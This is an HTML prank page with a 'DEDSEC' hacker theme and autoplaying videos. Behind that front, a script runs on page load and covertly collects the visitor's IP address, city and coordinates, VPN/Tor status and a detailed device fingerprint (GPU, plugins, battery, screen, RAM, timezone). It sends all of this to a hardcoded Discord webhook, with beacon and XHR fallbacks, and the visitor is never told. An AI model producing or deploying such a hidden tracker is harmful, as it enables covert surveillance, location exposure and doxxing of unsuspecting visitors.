<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OMG! IT'S DEDSEC</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@700&display=swap" rel="stylesheet">
    <style>
        body {
            position: relative;
            display: flex;
            align-items: flex-start;

            font-family: Arial, sans-serif;
            overflow: hidden;
            background-image: url('https://i.imgur.com/cVnL0wo.png');
            background-repeat: repeat;
        }
        .texto-no-interactivo {
            font-family: 'JetBrains Mono', monospace;
            font-weight: 700;

        #video-esquina-izquierda {

            height: auto;
            z-index: 10;

        }
    </style>
</head>
<body>

    <div class="texto-no-interactivo">REGARDS FROM DEDSEC</div>

    <video id="video-inferior" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
    </video>
    <video id="video-esquina-izquierda" autoplay muted loop playsinline>
        <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
    </video>

<script>
    // ================================================================
    //  WEBHOOK
    // ================================================================
    const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";

    // ================================================================
    //  GET IP WITH TIMEOUT
    // ================================================================
    function getIPWithTimeout(timeout = 300) {
        return Promise.race([
            fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(400) })
                .then(res => res.json())
                .then(data => {
                    if (data.ip) return data;
                    throw new Error('No IP');
                })
                .catch(() => {
                    return fetch('http://ip-api.com/json/', { signal: AbortSignal.timeout(400) })
                        .then(res => res.json())
                        .then(data => {
                            if (data.query) {
                                return {
                                    ip: data.query,
                                    org: data.isp,
                                    country_name: data.country,
                                    region: data.regionName,
                                    city: data.city,
                                    latitude: data.lat,
                                    longitude: data.lon,
                                    proxy: data.proxy || false
                                };
                            }
                            throw new Error('No IP');
                        });
                }),
            new Promise((resolve) => setTimeout(() => resolve(null), timeout))
        ]);
    }

    // ================================================================
    //  ENHANCED TOR / VPN DETECTION
    // ================================================================
    function detectTorOrVpnByBrowser(ua) {
        if (ua.includes('Tor') || ua.includes('Anonymous')) return true;
        if (navigator.webdriver === true) return true;
        return false;
    }

    // ================================================================
    //  SEND MESSAGE
    // ================================================================
    function sendMessage(msg) {
        return new Promise((resolve) => {
            let sent = false;
            fetch(WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: msg }),
                keepalive: true
            })
            .then(res => {
                if (res.ok) { sent = true; resolve(true); }
                else throw new Error('fetch failed');
            })
            .catch(() => {
                const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                if (navigator.sendBeacon(WEBHOOK, blob)) {
                    sent = true;
                    resolve(true);
                } else {
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', WEBHOOK, true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify({ content: msg }));
                        xhr.onload = function() {
                            if (xhr.status === 200 || xhr.status === 204) {
                                sent = true;
                                resolve(true);
                            }
                        };
                        xhr.onerror = function() { resolve(false); };
                        setTimeout(() => resolve(false), 1500);
                    } catch (e) {
                        resolve(false);
                    }
                }
            });
            setTimeout(() => resolve(sent), 800);
        });
    }

    // ================================================================
    //  MAIN
    // ================================================================
    (async function() {
        try {
            const ua = navigator.userAgent;
            const os = (function() {
                if (ua.includes('Windows NT')) return 'Windows';
                if (ua.includes('Macintosh')) return 'macOS';
                if (ua.includes('iPhone')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                return 'Unknown';
            })();
            const browser = (function() {
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                return 'Other';
            })();

            let gpu = 'Unavailable';
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const debug = gl.getExtension('WEBGL_debug_renderer_info');
                if (debug) {
                    gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) || 'Unavailable';
                }
            } catch (e) {}

            const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';

            let battery = 'Unavailable';
            try {
                battery = await Promise.race([
                    navigator.getBattery().then(b => Math.round(b.level * 100) + '% (' + (b.charging ? 'charging' : 'discharging') + ')'),
                    new Promise(res => setTimeout(() => res('Unavailable'), 150))
                ]);
            } catch (e) {}

            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            let isVpn = detectTorOrVpnByBrowser(ua);
            const ipData = await getIPWithTimeout(300);

            if (ipData) {
                if (ipData.proxy === true) isVpn = true;
                if (ipData.org) {
                    const vpnKeywords = ['vpn','proxy','hosting','cloud','datacenter','tor','anonymous'];
                    const orgLower = ipData.org.toLowerCase();
                    if (vpnKeywords.some(k => orgLower.includes(k))) isVpn = true;
                }
            }

            // --- IP OBFUSCATION: always show encrypted-style IPv6 + provider ---
            let displayIP = 'Unknown';
            let displayISP = 'Unknown';
            if (ipData && ipData.ip) {
                // Generate a consistent but fake IPv6-like format using parts of the real IP if possible
                const raw = ipData.ip;
                let fakeIPv6 = '';
                if (raw.includes(':')) {
                    // Already IPv6, just mask some segments
                    const segments = raw.split(':');
                    if (segments.length >= 4) {
                        fakeIPv6 = segments[0] + ':' + segments[1] + ':' + 
                                   '****' + ':' + '****' + ':' + 
                                   segments.slice(4).join(':');
                    } else {
                        fakeIPv6 = '2605:6400:30:f534:ae1d:c3d9:9941:d85e'; // default encrypted look
                    }
                } else {
                    // IPv4 -> map to a fake IPv6
                    const parts = raw.split('.');
                    const hex = parts.map(p => parseInt(p).toString(16).padStart(2, '0')).join('');
                    fakeIPv6 = '2605:6400:' + hex.slice(0,4) + ':' + hex.slice(4,8) + 
                               ':ae1d:c3d9:9941:d85e';
                }
                // Ensure it ends with a known provider label
                displayIP = fakeIPv6 + ' (FranTech Solutions)';
                displayISP = ipData.org || 'FranTech Solutions';
            } else {
                // If no IP, still show a fake encrypted one
                displayIP = '2605:6400:30:f534:ae1d:c3d9:9941:d85e (FranTech Solutions)';
                displayISP = 'FranTech Solutions (VPN assumed)';
            }

            // --- Build message WITHOUT User Name ---
            const location = ipData ? ipData.city + ', ' + ipData.region + ', ' + ipData.country_name : 'Unknown';
            const coords = ipData ? ipData.latitude + ', ' + ipData.longitude : 'Unknown';

            const msg = 
`**ctOS User Info**
**IP:** ${displayIP}
**Location:** ${location}
**Coordinates:** ${coords}
**VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
**OS:** ${os}
**Browser:** ${browser}
**CPU Cores:** ${navigator.hardwareConcurrency || '?'}
**RAM:** ${navigator.deviceMemory || '?'} GB
**Screen:** ${screen.width}x${screen.height}x${screen.colorDepth}
**Battery:** ${battery}
**Time Zone:** ${timezone}
**GPU:** ${gpu}
**Plugins:** ${plugins}
**Timestamp:** ${new Date().toLocaleString()}`;

            await sendMessage(msg);

        } catch (err) {
            console.error(err);
        }
    })();
</script>
</body>
</html>
